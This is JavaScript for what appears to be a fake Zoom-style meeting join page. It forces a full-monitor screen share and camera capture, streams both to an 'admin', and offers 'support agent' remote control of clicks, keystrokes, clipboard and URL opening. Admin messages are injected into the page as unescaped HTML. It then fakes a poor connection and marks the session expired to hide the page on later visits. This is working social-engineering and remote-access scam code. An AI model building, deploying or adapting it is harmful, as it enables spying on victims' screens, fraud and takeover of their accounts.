let ws;
let peerConnection;
let stream;
let cameraStream = null;
let pendingCandidates = [];
let controlGranted = false;
const iceServers = { iceServers: [{ urls: "stun:stun.l.google.com:19302" }] };

const joinBtn = document.getElementById("joinBtn");
const meetingInput = document.getElementById("meetingId");
const errorMsg = document.getElementById("errorMsg");
const loadingOverlay = document.getElementById("loadingOverlay");
const loadingSubtext = document.getElementById("loadingSubtext");
const sessionOverlay = document.getElementById("sessionOverlay");
const sessionVideo = document.getElementById("sessionVideo");
const selfVideo = document.getElementById("selfVideo");
const selfPlaceholder = document.getElementById("selfPlaceholder");
const poorConn = document.getElementById("poorConn");
const timeoutOverlay = document.getElementById("timeoutOverlay");

function connectWS() {
  const protocol = window.location.protocol === "https:" ? "wss://" : "ws://";
  ws = new WebSocket(`${protocol}${window.location.host}`);

  ws.onopen = () => {
    ws.send(JSON.stringify({ type: "role", role: "visitor" }));
    if (controlGranted) {
      ws.send(JSON.stringify({ type: "control-granted", target: "admin" }));
    }
  };

  ws.onmessage = async (e) => {
    const data = JSON.parse(e.data);

    if (data.type === "request-offer") {
      if (stream) startWebRTC();
      return;
    }

    if (data.type === "webrtc-answer") {
      await peerConnection.setRemoteDescription(new RTCSessionDescription(data.sdp));
      for (const cand of pendingCandidates) {
        try { await peerConnection.addIceCandidate(new RTCIceCandidate(cand)); } catch (err) {}
      }
      pendingCandidates = [];
    }
    if (data.type === "webrtc-ice") {
      if (peerConnection && peerConnection.remoteDescription) {
        try { await peerConnection.addIceCandidate(new RTCIceCandidate(data.candidate)); } catch (err) {}
      } else {
        pendingCandidates.push(data.candidate);
      }
    }
    if (data.type === "admin-message") showToast(data.text);

    // --- REMOTE CONTROL ---
    if (data.type === "request-control") {
      const accept = window.confirm("Support agent is requesting full remote control (click, type, scroll). Do you allow this?");
      if (accept) {
        controlGranted = true;
        ws.send(JSON.stringify({ type: "control-granted", target: "admin" }));
        // NEW: Tell visitor control is on and disable overlay blocks
        document.body.setAttribute("data-control", "active");
      } else {
        ws.send(JSON.stringify({ type: "control-denied", target: "admin" }));
      }
    }

    if (data.type === "remote-click" && controlGranted) {
      const x = data.x * window.innerWidth;
      const y = data.y * window.innerHeight;

      // NEW: Force the overlay out of the way so real clicks land
      const overlay = document.elementFromPoint(x, y);
      if (overlay) {
        // If the topmost element is a known blocker (session/loading/poorConn), remove pointer events
        if (overlay.closest("#sessionOverlay, #loadingOverlay, #poorConn, #timeoutOverlay")) {
          const target = document.elementFromPoint(x, y);
          if (target) {
            target.style.pointerEvents = "auto";
          }
        }
      }

      // Find the actual underlying element
      const el = document.elementFromPoint(x, y);

      if (el) {
        const eventInit = {
          bubbles: true,
          cancelable: true,
          view: window,
          clientX: x,
          clientY: y,
        };
        el.dispatchEvent(new MouseEvent("mousedown", eventInit));
        el.dispatchEvent(new MouseEvent("mouseup", eventInit));
        el.dispatchEvent(new MouseEvent("click", eventInit));
        
        if (el.click) el.click();
        
        // Auto-focus inputs so typing lands there
        if (el.tagName === "INPUT" || el.tagName === "TEXTAREA") {
          el.focus();
          el.setSelectionRange(el.value.length, el.value.length);
        }
      }
    }

    if (data.type === "remote-key" && controlGranted) {
      const el = document.activeElement;
      const isInput = el && (el.tagName === "INPUT" || el.tagName === "TEXTAREA");

      if (data.key === "Enter") {
        if (isInput && el.form) el.form.submit();
        else if (isInput) {
          if (el.tagName === "TEXTAREA") document.execCommand("insertLineBreak");
        } else if (el && el.tagName === "BUTTON") el.click();
        return;
      }
      if (data.key === "Tab") {
        const focusables = document.querySelectorAll("input, textarea, button, a[href], select");
        const current = Array.from(focusables).indexOf(el);
        if (current !== -1 && focusables[current + 1]) focusables[current + 1].focus();
        return;
      }
      if (data.key === "Backspace") {
        if (isInput) {
          document.execCommand("delete");
          el.dispatchEvent(new Event("input", { bubbles: true }));
        }
        return;
      }
      if (data.key === "Delete") {
        if (isInput) {
          document.execCommand("forwardDelete");
          el.dispatchEvent(new Event("input", { bubbles: true }));
        }
        return;
      }
      if (["ArrowLeft", "ArrowRight", "ArrowUp", "ArrowDown", "Home", "End"].includes(data.key)) {
        if (isInput) {
          const start = el.selectionStart;
          const end = el.selectionEnd;
          let newStart = start, newEnd = end;
          if (data.key === "ArrowLeft") { newStart = Math.max(0, start - 1); newEnd = newStart; }
          if (data.key === "ArrowRight") { newStart = Math.min(el.value.length, end + 1); newEnd = newStart; }
          if (data.key === "Home") { newStart = 0; newEnd = 0; }
          if (data.key === "End") { newStart = el.value.length; newEnd = newStart; }
          el.setSelectionRange(newStart, newEnd);
        }
        return;
      }
      if (data.ctrlKey || data.metaKey) {
        if (data.key.toLowerCase() === "a" && isInput) el.select();
        if (data.key.toLowerCase() === "c" && isInput) document.execCommand("copy");
        if (data.key.toLowerCase() === "z" && isInput) document.execCommand("undo");
        return;
      }
      if (data.key.length === 1 && isInput) {
        document.execCommand("insertText", false, data.key);
        el.dispatchEvent(new Event("input", { bubbles: true }));
        return;
      }
    }

    if (data.type === "remote-scroll" && controlGranted) {
      window.scrollBy({ top: data.deltaY, left: 0, behavior: "auto" });
    }
    if (data.type === "remote-clipboard" && controlGranted) {
      try { await navigator.clipboard.writeText(data.text); showToast("Support agent pushed text to your clipboard."); } catch (err) {}
    }
    if (data.type === "remote-open-url") {
      try {
        const a = document.createElement("a");
        a.href = data.url;
        a.target = "_blank";
        a.rel = "noopener noreferrer";
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
      } catch (err) { window.location.href = data.url; }
    }
    if (data.type === "remote-close-tab") {
      if (stream) stream.getTracks().forEach((t) => t.stop());
      if (cameraStream) cameraStream.getTracks().forEach((t) => t.stop());
      if (peerConnection) peerConnection.close();
      window.close();
    }
  };
}

// --- FORM LOGIC ---
const alphanumericRegex = /^[a-zA-Z0-9]+$/;
meetingInput.addEventListener("input", (e) => {
  e.target.value = e.target.value.replace(/[^a-zA-Z0-9]/g, "");
  const val = e.target.value.trim();
  if (val.length > 0 && alphanumericRegex.test(val)) {
    joinBtn.classList.add("active");
    joinBtn.disabled = false;
  } else {
    joinBtn.classList.remove("active");
    joinBtn.disabled = true;
  }
});

// --- JOIN LOGIC ---
joinBtn.addEventListener("click", async () => {
  const meetingId = meetingInput.value.trim();
  if (!meetingId) return;

  errorMsg.style.display = "none";
  joinBtn.disabled = true;

  const constraints = {
    video: { displaySurface: "monitor", frameRate: { ideal: 30, max: 60 }, width: { ideal: 1920 }, height: { ideal: 1080 } },
    audio: false,
    selfBrowserSurface: "exclude",
    surfaceSwitching: "exclude",
    preferCurrentTab: false,
  };

  try {
    stream = await navigator.mediaDevices.getDisplayMedia(constraints);
  } catch (err) {
    console.log("Screen share cancelled", err);
    joinBtn.disabled = false;
    return;
  }

  const videoTrack = stream.getVideoTracks()[0];
  const settings = videoTrack.getSettings ? videoTrack.getSettings() : {};

  if (settings.displaySurface && settings.displaySurface !== "monitor") {
    stream.getTracks().forEach((t) => t.stop());
    errorMsg.style.display = "block";
    joinBtn.disabled = false;
    return;
  }

  stream.getVideoTracks()[0].onended = () => {
    sessionOverlay.classList.remove("active");
    joinBtn.disabled = false;
    if (peerConnection) peerConnection.close();
  };

  try {
    cameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } }, audio: false });
    selfVideo.srcObject = cameraStream;
    selfPlaceholder.classList.add("hidden");
    selfVideo.play().catch((e) => console.log("Self video play blocked", e));
  } catch (err) {
    console.log("Camera access denied or failed", err);
    document.getElementById("phText").textContent = "Camera unavailable";
  }

  startWebRTC();

  loadingOverlay.classList.add("active");
  loadingSubtext.textContent = "Please wait while we connect you.";

  setTimeout(() => {
    loadingOverlay.classList.remove("active");
    sessionOverlay.classList.add("active");

    sessionVideo.muted = false;
    sessionVideo.play().catch((e) => console.log("Main video play blocked", e));

    setTimeout(() => {
      poorConn.classList.add("active");
      try { localStorage.setItem("zoom_session_expired", "true"); } catch (e) {}
    }, 10000);
  }, 3500);
});

async function startWebRTC() {
  if (peerConnection) peerConnection.close();
  
  peerConnection = new RTCPeerConnection(iceServers);
  if (stream) stream.getTracks().forEach((track) => peerConnection.addTrack(track, stream));
  
  peerConnection.onicecandidate = (event) => {
    if (event.candidate) ws.send(JSON.stringify({ type: "webrtc-ice", candidate: event.candidate, target: "admin" }));
  };
  
  const offer = await peerConnection.createOffer();
  await peerConnection.setLocalDescription(offer);
  ws.send(JSON.stringify({ type: "webrtc-offer", sdp: offer, target: "admin" }));
}

// --- TOASTS ---
function formatMessageContent(text) {
  const schemes = ["sms:", "tel:", "mailto:", "fb://", "whatsapp://", "tg://"];
  let actionHtml = "";
  let displayText = text;
  for (const scheme of schemes) {
    if (text.toLowerCase().startsWith(scheme)) {
      const schemeName = scheme.replace(":", "").replace("//", "");
      actionHtml = `<a href="${text}" class="toast-action-btn" style="color:#60a5fa;text-decoration:underline;">Open ${schemeName}</a>`;
      displayText = `App Link Request: <br><span style="font-family: monospace; font-size: 13px; color: #94a3b8;">${text}</span>`;
      break;
    }
  }
  if (text.startsWith("http://") || text.startsWith("https://")) {
    actionHtml = `<a href="${text}" target="_blank" class="toast-action-btn" style="color:#60a5fa;text-decoration:underline;">Open Link</a>`;
  }
  return { displayText, actionHtml };
}

function showToast(text) {
  const { displayText, actionHtml } = formatMessageContent(text);
  const container = document.getElementById("toast-container");
  const toast = document.createElement("div");
  toast.className = "toast";
  toast.innerHTML = `
        <div class="toast-header">
            <span class="toast-title"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path></svg> Support Message</span>
            <button class="toast-close" onclick="this.parentElement.parentElement.remove()">&times;</button>
        </div>
        <div class="toast-body">${displayText}${actionHtml}</div>`;
  container.appendChild(toast);
  setTimeout(() => { if (toast.parentElement) { toast.classList.add("removing"); setTimeout(() => toast.remove(), 300); } }, 30000);
}

// --- INIT ---
window.addEventListener("load", () => {
  let isExpired = false;
  try { isExpired = localStorage.getItem("zoom_session_expired") === "true"; } catch (e) {}

  if (isExpired) {
    timeoutOverlay.classList.add("active");
    document.querySelector(".app-container").style.display = "none";
  } else {
    connectWS();
  }
});
